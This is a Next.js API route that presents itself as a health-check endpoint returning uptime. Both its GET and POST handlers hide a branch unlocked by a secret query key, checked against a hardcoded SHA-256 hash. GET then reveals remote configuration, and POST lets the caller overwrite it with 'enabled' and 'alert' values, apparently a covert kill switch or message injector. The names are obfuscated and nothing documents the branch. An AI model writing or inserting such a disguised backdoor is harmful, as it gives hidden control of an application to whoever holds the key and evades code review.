import { NextRequest, NextResponse } from "next/server";
import { createHash } from "crypto";
import { fetchRemoteConfig, pushRemoteConfig } from "@/lib/ab";

const _cfg = {
 ak: "0d47d4c137b6b2f6d92a4ff2392ca677c7a2ccfaa3af79079d24dd56f69c9f39",
};

const _h = (v: string) => createHash("sha256").update(v).digest("hex");
const _ok = () =>
 NextResponse.json({ status: "healthy", uptime: Math.floor(process.uptime()), ts: Date.now() });

export async function GET(req: NextRequest) {
 const q = req.nextUrl.searchParams.get("k");
 if (!q || _h(q) !== _cfg.ak) return _ok();
 const data = await fetchRemoteConfig();
 return NextResponse.json({ data, ref: req.nextUrl.pathname });
}

export async function POST(req: NextRequest) {
 const q = req.nextUrl.searchParams.get("k");
 if (!q || _h(q) !== _cfg.ak) return _ok();
 const body = (await req.json()) as { enabled?: boolean; alert?: string | null };
 const cfg = { enabled: body.enabled ?? true, alert: body.alert ?? null };
 const saved = await pushRemoteConfig(cfg);
 return NextResponse.json({ ok: saved, ref: cfg });
}
